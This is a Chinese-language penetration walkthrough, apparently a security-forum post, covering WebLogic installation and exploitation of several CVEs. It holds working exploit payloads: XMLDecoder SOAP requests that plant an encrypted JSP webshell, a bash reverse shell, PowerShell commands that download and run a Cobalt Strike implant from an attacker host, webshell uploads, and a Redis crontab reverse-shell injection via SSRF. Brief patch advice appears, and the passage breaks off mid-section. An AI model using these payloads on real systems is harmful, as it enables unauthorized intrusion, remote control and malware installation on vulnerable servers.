### 一.weblogic简介

WebLogic是美国Oracle公司出品的一个application server确切的说是一个基于JAVAEE架构的中间件，BEA WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

WebLogic Server具有标准和可扩展性的优点，对业内多种标准都可全面支持，包括EJB、JSP、Servlet、JMS、JDBC、XML（标准通用标记语言的子集）和WML，使Web应用系统的实施更为简单，并且保护了投资，同时也使基于标准的解决方案的开发更加简便，同时WebLogic Server以其高扩展的架构体系闻名于业内，包括客户机连接的共享、资源pooling以及动态网页和EJB组件群集。

默认端口： 7001

目前较为活跃的版本：

```php
Weblogic 10.3.6.0
Weblogic 12.1.3.0
Weblogic 12.2.1.1
Weblogic 12.2.1.2
Weblogic 12.2.1.3
```

### 二.weblogic安装

下载地址：<https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html>

weblogic最新的版本需要jdk1.8以上，如果jdk1.7或者以下，可能会安装不了，jdk1.6的话应该是10.3.6及以下。

#### weblogic 10.3.6安装

这里安装环境为win7

![image-20210809105230816](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dac817eb3b5a9e9b775f7f40768f66e2b26b0d23.png)

![image-20210809105644198](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a73fc910d2f0a2a4c3faaceebd6db9e9b6a01963.png)

双击启动安装

![image-20210809105814087](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-333430259dce68bde3c87d6463082462a2572c52.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-64d06bf6618aa399e83ea0238b73d0ef1c24f975.png)

![image-20210809110119887](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b2bbce0ab799e1c1363775108b0962cda4691e6a.png)

![image-20210809110133160](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e03c834519822c5cd0e780099ecc425c6e65383c.png)

![image-20210809110203679](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-07adc0b777f9c99d15181b624f0d3747d568f325.png)

![image-20210809110238157](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f79ae653019920fc18dd5e96e121cb26ad975b5a.png)

![image-20210809154158552](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-18dba3b45e13ddc50d737b7cc9f4c2ed3e117b14.png)

![image-20210809154229316](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f517bf9fbb82a7554e7bdac9f217a22cb313bb8a.png)

![image-20210809110431311](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c9d2e25da1a83b40d0eeb2ff01a604b43fd62e1f.png)

&lt;img src="<https://gitee.com/zgd1999128/img/raw/master/img/image-20210809110646798.png>" alt="image-20210809110646798" style="zoom: 50%;" /&gt;

安装完成后自动出现快速启动页面

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-45836a7f1f81d73b26c7e76588d802288ce5fae7.png)

![image-20210809111057748](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-56de3b80a1112f59c5e6dcd8888298ea7011d143.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9f2fbad59bedd25babb38045fc00dde777865536.png)

这里默认即可

![image-20210809111349116](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d08d9b0446fd735f0f84a217766f8349b1e3182b.png)

这里我的是zcc12345

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5ad4e9e6643c6bebf30ad8e584a96e1457f1d227.png)

开发模式：该模式启用自动部署；生产模式：该模式关闭自动部署(MyEcipse版本不支持产品模式)

![image-20210809134240451](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ff6e530df072a1f6bb16914f8e5d2d0915d7a01a.png)

![image-20210809134317197](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f4cfd24aaad6501bf9364183a4809881dfcbdf07.png)

![image-20210809134433087](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-977322a082f26222b155be74628008c562e2eeb5.png)

一直默认下一步之后点击创建

![image-20210809134616650](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2d0237de473ebba2909c9b87d586fbee2a06fed5.png)

![image-20210809134650091](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e7e4231088849dff00d1d82b79362254308c7c02.png)

#### weblogic 10.3.6配置

进入该目录下，双击红框中的startWebLogic.cmd，启动weblogic

![image-20210809134918621](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b67594592256ac08c827ed875b0372245fddcf33.png)

输入刚刚设置的weblogic用户名和密码

```php
weblogic
zcc12345
```

![image-20210809135306951](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9e5d843b1ebcb57cfe5e98afb2cfeec5a5041deb.png)

打开浏览器输入控制台url，进入控制台进行管理

```php
http://192.168.10.154:7001/console/
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a5901bfb9f9ba83654c4341ceb1a445c24ecd32b.png)

用户名密码还是上面设置的weblogic/zcc12345

#### weblogic 12.1.3安装

12版本的安装需要在jdk7的环境下，这里我已经安装完成

![image-20210814161036126](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9b03db2ed599e4f45f50d45d89a050a0e011d353.png)

![image-20210814162020929](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-33d39ea50144e5986391aa3676ddda676e5052ad.png)

官网下载安装包，官网链接：<https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html>

![image-20210814160458436](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-677597ab0a372b4680fa9384f201395a557bfdc4.png)

将下载好的安装包放入jdk的bin目录下，防止因环境变量带空格导致的错误，过程一直默认下一步即可

![image-20210814162427162](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f60187efeb10b2dff3588540f4e417cf4c9ad991.png)

这里一定要以管理员身份运行，不然提取文件会失败

```php
java -jar fmw_12.1.3.0.0_wls.jar
```

![image-20210814163432029](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e8cf2c7a3c2ddce3560f07475825a5bd8912f6f6.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-73adcae7bed64a37471e979b455198eb647c7ed3.png)

![image-20210814165250515](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-576a4e426abc5f6dba5bf9eb0a7e4ff36280d346.png)

![image-20210814165616715](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-02a33da21e856e91b5d04968fd725726aeb3cac3.png)

接下来安装域

在电脑上找到Configuration Wizard，双击运行

![image-20210814165704899](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4b766eddebf64cded8a2b33e105769d82fc1ded5.png)

选择下一步-&gt;下一步

![image-20210814165802594](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-201ab0ee06854f0bacc0f43ce64d0b80829a49cd.png)

输入口令，这里用户名默认，口令设置的是zcc12345

![image-20210814165857818](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ba498966748fd7407cac1a8f871f4462a6187279.png)

下一步

![image-20210814165945030](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8716f6862dd45c4bb39ab10597aa0bd8214a9f7d.png)

![image-20210814165958254](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-47e53c3227f76ce8e7b39b69da5f79746d59b5b1.png)

选本机IP

![image-20210814170040154](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ab3e4fe80fbca4ffd2dcfb2a2e0de69f0e8e28cd.png)

![image-20210814170128516](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6e63784d4761f8d39f1de4c85a284cdf754a9097.png)

![image-20210814170217064](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-be79b575ac1e5ab8891af608fa03c5280dd8d2e9.png)

![image-20210814170242532](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3052711a5abaef0793d3aacad36f3830a8144fe9.png)

![image-20210814170306146](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d66d0a8aea68e0d4350cad6b691c64cf2f247fd9.png)

#### weblogic 12.1.3配置

进入该目录下启动，这里不再需要输入账号密码

```php
C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain
```

![image-20210814170531939](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e3bdeb5dbe23f579b63545f5245371122e69ce85.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f02a1b1e103728e0a8879bb6c9eca956bf5af094.png)

成功搭建，可正常访问。

### 三.weblogic渗透总结

#### 1.XMLDecoder 反序列化漏洞 CVE-2017-10271

##### 漏洞简介

Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。

##### 影响版本

```php
10.3.6.0
12.1.3.0.0
12.2.1.1.0
```

##### 验证漏洞

当访问该路径 /wls-wsat/CoordinatorPortType （POST），出现如下图所示的回显时，只要是在wls-wsat包中的皆受到影响，可以查看web.xml查看所有受影响的url，说明存在该漏洞；

![image-20210809140942304](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-63ed93e634817f2a6a38127b06f11749f6279612.png)

```php
C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war\WEB-INF
```

进行该路径查看web.xml;

![image-20210809141314849](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c7f00692814945d8836fdb683e30c17f3696a940.png)

![image-20210809141512699](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b3c2599723cbd7ad7a248b9fb469aea0de11ebf2.png)

总结下来就是下面这些url会受到影响；

```php
/wls-wsat/CoordinatorPortType
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/ParticipantPortType
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationRequesterPortType11
```

##### 漏洞复现

抓包，修改内容

```php
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
 <soapenv:Header>
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
 <java><java version="1.4.0" class="java.beans.XMLDecoder">
 <object class="java.io.PrintWriter"> 
 <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zcc.jsp</string>
 <void method="println">
<string>
 <![CDATA[
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
 ]]>
 </string>
 </void>
 <void method="close"/>
 </object></java></java>
 </work:WorkContext>
 </soapenv:Header>
 <soapenv:Body/>
</soapenv:Envelope>
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-82b84fce73308d9fec77379eb70a79a5252ce27f.png)

![image-20210809162737924](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fba131ee6cc8d5792b98ab6ba914f5f1391739dc.png)

![image-20210809162717485](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a623a5a77aed1b662ba2d67bb456b1dee1075d32.png)

实现Linux反弹shell的poc：

```php
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: x.x.x.x:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 637

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/x.x.x.x/4444 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

实现win上线cs

```php
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.10.154:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 704

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>powershell</string>
 </void>
 <void index="1">
 <string>-Command</string>
 </void>
 <void index="2">
 <string>(new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc.exe','zcc.exe');start-process zcc.exe</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

cs生成后门木马

![image-20210810105923024](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-46fd72fd8b55366654fcf1b1e609a983177e994c.png)

放在kali上，开启简易的http服务

![image-20210810110037377](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0e1a9ece415d046cf97f20abfa4da87e051d35f9.png)

powershell上线cs：

```php
powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc.exe','zcc.exe');start-process zcc.exe
```

![image-20210810111100065](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2e4a8545320be9c94ee88f4a055c06ade097f571.png)

![image-20210810110916447](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ef71c590208bf9f9080784f7f252ada0f7fdc73e.png)

成功上线cs

##### 安全防护

前往Oracle官网下载10月份所提供的安全补丁：

<http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html>

#### 2.XMLDecoder 反序列化漏洞 CVE-2017-3506

##### 漏洞简介

cve-2017-10271与3506他们的漏洞原理是一样的,只不过10271绕过了3506的补丁，CVE-2017-3506的补丁加了验证函数，验证Payload中的节点是否存在object Tag。

```php
private void validate(InputStream is){
 WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
 try {
 SAXParser parser =factory.newSAXParser();
 parser.parse(is, newDefaultHandler() {
 public void startElement(String uri, StringlocalName, String qName, Attributes attributes)throws SAXException {
 if(qName.equalsIgnoreCase("object")) {
 throw new IllegalStateException("Invalid context type: object");
 }
 }
 });
 } catch(ParserConfigurationException var5) {
 throw new IllegalStateException("Parser Exception", var5);
 } catch (SAXExceptionvar6) {
 throw new IllegalStateException("Parser Exception", var6);
 } catch (IOExceptionvar7) {
 throw new IllegalStateException("Parser Exception", var7);
 }
 }
```

##### 影响版本

```php
10.3.6.0
12.1.3.0
12.2.1.0
12.2.1.1 
12.2.1.2
```

##### 漏洞复现

利用的poc:

```php
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
 <soapenv:Header>
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
 <java>
 <object class="java.io.PrintWriter">
 <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zcc3.jsp</string>
 <void method="println">
 <string>
 <![CDATA[
 <% out.print("zcc1 hello"); %>
 ]]>
 </string>
 </void>
 <void method="close"/>
 </object>
 </java>
 </work:WorkContext>
 </soapenv:Header>
 <soapenv:Body/>
</soapenv:Envelope>
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2ba9919aeb8ac97b539fd4cf2f54d04944651b1a.png)

![image-20210810141515224](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-100ed6496f3b78a1c12b44224d22dcc6e98b6b8e.png)

##### 安全防护

前往Oracle官网下载10月份所提供的安全补丁：

<http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html>

#### 3.wls-wsat反序列化远程代码执行漏洞 CVE-2019-2725

##### 漏洞简介

此漏洞实际上是CVE-2017-10271的又一入口，CVE-2017-3506的补丁过滤了object；CVE-2017-10271的补丁过滤了new，method标签，且void后面只能跟index，array后面只能跟byte类型的class；CVE-2019-2725的补丁过滤了class，限制了array标签中的byte长度。

##### 影响组件

```php
bea_wls9_async_response.war
wsat.war
```

##### 影响版本

```php
10.3.*
12.1.3
```

##### 验证漏洞

访问 /\_async/AsyncResponseService，返回200则存在，404则不存在

查看web.xml得知受影响的url如下：

访问路径为：

```php
C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\WEB-INF
```

![image-20210810143210331](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bd52acd4de26878a70d6191c5041de53d8bd4504.png)

```php
/_async/AsyncResponseService
/_async/AsyncResponseServiceJms
/_async/AsyncResponseServiceHttps
/_async/AsyncResponseServiceSoap12
/_async/AsyncResponseServiceSoap12Jms
/_async/AsyncResponseServiceSoap12Https
```

##### 漏洞复现

访问该url，回显如下，说明存在漏洞

![image-20210810142738800](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-219282e563e3b9cb2bc3c38496fff7aef5d75996.png)

win上线cs的poc如下，这里exe用的是上面生成的：

```php
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>powershell</string>
</void>
<void index="1">
<string>-Command</string>
</void>
<void index="2">
<string>(new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc1.exe','zcc1.exe');start-process zcc1.exe</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header><soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7cb585e7bc67dad871dcdaa1a1755f91c041d798.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d61e280b8287f889ed969648ffa87df2ed586a09.png)

##### 安全防护

1、升级本地JDK环境

2、及时安装官方补丁

#### 4.WebLogic T3协议反序列化命令执行漏洞 CVE-2018-2628

##### 漏洞简介

远程攻击者可利用该漏洞在未授权的情况下发送攻击数据，通过T3协议（EJB支持远程访问，且支持多种协议。这是Web Container和EJB Container的主要区别）在Weblogic Server中执行反序列化操作，利用RMI（远程方法调用） 机制的缺陷，通过 JRMP 协议（Java Remote Messaging Protocol：java远程消息交换协议）达到执行任意反序列化 payload 的目的。

##### 影响版本

```php
10.3.6.0
12.1.3.0
12.2.1.1
12.2.1.2
```

##### 相关漏洞

```php
CVE-2015-4852
CVE-2016-0638
CVE-2016-3510
CVE-2017-3248
CVE-2018-2893
CVE-2016-0638
```

##### 验证漏洞

使用脚本跑，脚本运行需python2环境，出现如下图所示的回显时，说明存在该漏洞；

脚本链接：<https://github.com/shengqi158/CVE-2018-2628>

![image-20210810160702675](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1f083235381e140642e1961b997e901de4a2b0b9.png)

![image-20210810160718697](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6b48eca4dd3c2a35c73814f7c85a6ff79e38f648.png)

##### 漏洞复现

windows-getshell，使用k8weblogicGUI.exe

![image-20210810163031055](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-71f4c22e4c9d58db3e6fb34192bbc5dd4441fbe6.png)

这里出了点问题，文件名改成了1.jsp

![image-20210810164738168](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cdb763cc8bee4cfeb2866e55e4637d57f6ab508f.png)

用脚本连接得到交互shell,脚本运行需python2环境

脚本链接：<https://github.com/jas502n/CVE-2018-2628>

![image-20210810165228766](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6aa75febe60196cd60d5e1d7fe5b660585d09c1e.png)

在此处上线cs，用的依旧是上面的马，改名zcc3.exe

```php
powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc3.exe','zcc3.exe');start-process zcc3.exe
```

![image-20210810170001387](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f3416c75b72fce926b2150a55eda4771e22dfe7a.png)

![image-20210810170039655](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-437ce76ba6014ff7082f18efec6fc4d99063b4b4.png)

##### 安全防护

过滤t3协议，再域结构中点击 安全-&gt;筛选器，选择筛选器填：

```php
weblogic.security.net.ConnectionFilterImpl
```

![image-20210813140332501](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3ddd7c623d8c0ff0b50398ba684a45cf2c3a9932.png)

保存后重启weblogic即可。

#### 5.WebLogic 未授权访问漏洞（CVE-2018-2894）

##### 漏洞简介

Weblogic Web Service Test Page中有两个未授权页面，可以上传任意文件。但是有一定的限制，该页面在开发模式下存在，在生产模式下默认不开启，如果是生产模式，需要登陆后台进行勾选启动web服务测试页，如下图。

![image-20210813145148182](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2c2b73f74f6c5afc807ee4e5c8791f9038669653.png)

##### 影响版本

```php
10.3.6
12.1.3
12.2.1.2
12.2.1.3
```

##### 验证漏洞

测试页有两个

```php
/ws_utc/config.do
/ws_utc/begin.do
```

##### 漏洞复现

这里要注意的是12版本，以前以及现在的默认安装是“开发模式”，“生产模式”下没有这两处上传点。如果是生产模式，需要登陆后台进行如下配置：（开发环境下不需要！！）

![image-20210814171049349](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a5433d3b1cc754bc3dd0a9b91883ec8f30f1c097.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8a9571313a492f8e6b2d047ef6d8eea63d6229fb.png)

勾选启用web服务测试项，保存重启weblogic即可

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-08326c57d487993615e5390c4ec0859fdc4a80a8.png)

> 1.测试/ws\_utc/config.do

访问/ws\_utc/config.do页面，首先设置一下路径，设置Work Home Dir为ws\_utc应用的静态文件css目录，因为默认上传目录不在Web目录无法执行webshell，这里设置为：(css访问不需要任何权限)

```php
C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3\cmprq0\war\css
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3199f165e961326a6c4de9dbc0d49f27f98b54db.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d46d6e179b33a5149e39610ff08da4bb1b890b9c.png)

![image-20210813152013436](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-92f5afc7769b943dcef851c13eab80893decf4ab.png)

提交后，点击左边安全-&gt;添加，上传jsp大马

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dcf6a8b6671a1138ed54318bd1c2e80400b31539.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6833ec60e31acac0c03ded8a84a358d1b39be94b.png)

获取文件id：1628933663766

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b6384cb685ed9e241e5775fbaffd138817f6258b.png)

访问url：

```php
http://192.168.0.105/:7001/ws_utc/css/config/keystore/{时间戳}_{文件名}
http://192.168.0.105:7001/ws_utc/css/config/keystore/1628933663766_JspSpy.jsp
```

![image-20210814173547786](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ae7495c46f6165ff02ed5278de992f7612efc16b.png)

输入密码

![image-20210814173903964](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-da5c85d1974cbfe2377c5f3b57eb2394100499d5.png)

![image-20210814174004800](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a7b35aa448a716de4c6a09ed2ff7ee2b564cd7d8.png)

可以看见成功上线，同样方法也可以上传一句话或者其他木马。

> 2.测试 /ws\_utc/begin.do

大致方法和上面的url一样，这里需要注意的是

```php
1./ws_utc/begin.do使用的工作目录是在/ws_utc/config.do中设置的Work Home Dir；
2.利用需要知道部署应用的web目录；
3.在生产模式下不开启，后台开启后，需要认证。
```

![image-20210814175127172](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ac0f02701b115d096e40068d87dee651ffaf505e.png)

![image-20210814180116136](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-63632720aa81e2584b6ecb152dd5adb92091a401.png)

报错可以忽略，返回包中已有文件路径

```php
/css/upload/RS_Upload_2021-08-14_17-59-33_143/import_file_name_zcccmd.jsp
```

![image-20210814180054350](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b19c1138079385cf361126c36fe89684da33d1ce.png)

访问路径，成功访问，powershell上线cs

```php
http://192.168.0.105:7001/ws_utc/css/upload/RS_Upload_2021-08-14_17-59-33_143/import_file_name_zcccmd.jsp
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-caf046de760c2ef5950a2e2a7191f0fb0e35af63.png)

```php
powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.0.108/zcc.exe','zcc.exe');start-process zcc.exe
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-20f88af4e6e7f25a244379a753f091d25a913124.png)

![image-20210814181718937](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ec7c95debb4a3b47e2c74142a98036e3e312f36e.png)

##### 安全防护

1.启动生产模式后Config.do页面登录授权后才可访问

2.升级到最新版本，目前生产模式下已取消这两处上传文件的地方。

#### 6.Weblogic SSRF漏洞（CVE-2014-4210）

##### 漏洞简介

Oracle WebLogic Web Server既可以被外部主机访问，同时也允许访问内部主机。比如有一个jsp页面SearchPublicReqistries.jsp，我们可以利用它进行攻击，未经授权通过weblogic server连接任意主机的任意TCP 端口，可以能冗长的响应来推断在此端口上是否有服务在监听此端口，进而攻击内网中redis、fastcgi等脆弱组件。

##### 影响版本

```php
10.0.2.0
10.3.6.0
```

##### 验证漏洞

访问该路径，如果能正常访问，说明存在该漏洞

```php
/uddiexplorer/SearchPublicRegistries.jsp
```

![image-20210814185115833](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a521263fcc1ce3801ae28873091a9dda92f6ceed.png)

##### 漏洞复现

这里复现用的vulhub靶场环境

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3f49c939df4bbfe004202d1c7ef51da097f00413.png)

抓包，在url后跟端口,把url修改为自己搭建的服务器地址,访问开放的7001端口

![image-20210814192248494](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-caf80a119d8ddc5cc8e625e762c48b9f34445b43.png)

![image-20210814192515111](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3019fdd12063a8ea5c811f16db282a61097c2e6f.png)

发现返回如下信息，说明开放7001端口，但是不是http协议

```php
An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code &#40;Not Found&#41;.  Please ensure that your URL is correct, and the web service has deployed without error.   
```

访问未开放的端口，会返回下面的信息

```php
An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: &#39;1&#39; addresses, but could not connect over HTTP to server: &#39;127.0.0.1&#39;, port: &#39;7002&#39;
```

![image-20210814193417626](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9fa31647ad79d97924f94e743ae0c0d64cb7f042.png)

访问存在的端口，且为http协议时返回如下

```php
An error has occurred<BR>
weblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://192.168.0.108:80 which did not have a valid SOAP content-type: text/html.
```

![image-20210814203203147](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a5c876ef958427eabf338a38bda7d3bc0b521a63.png)

#### 7.weblogic SSRF联动Redis

##### 漏洞复现

依旧用的上面这个靶场

![image-20210814204005054](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4418c5e419f6e03e6c9c6cc8a3589aab4fd9d678.png)

这里查一下开启redis服务的这个容器IP，找到ip：172.20.0.2

```php
docker inspect a5a
```

![image-20210814204200558](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-883358d97ae9ea3bc7630589c26b05b107d2a5dd.png)

可以看见6379的端口存在，且为http协议

![image-20210814204413085](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3ffc03e2042797bbb440f55ca096bba8bbd624f8.png)

本机监听12345端口

![image-20210814204756777](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-318f234cceeeffc44090eefd9d7af584701b1b2a.png)

burp改包直接将弹shell脚本到本机kail上（192.168.0.104）

```php
set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.0.104/12345 0>&1\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
```

经过url编码后，写入bp中operator参数的后面:

```php
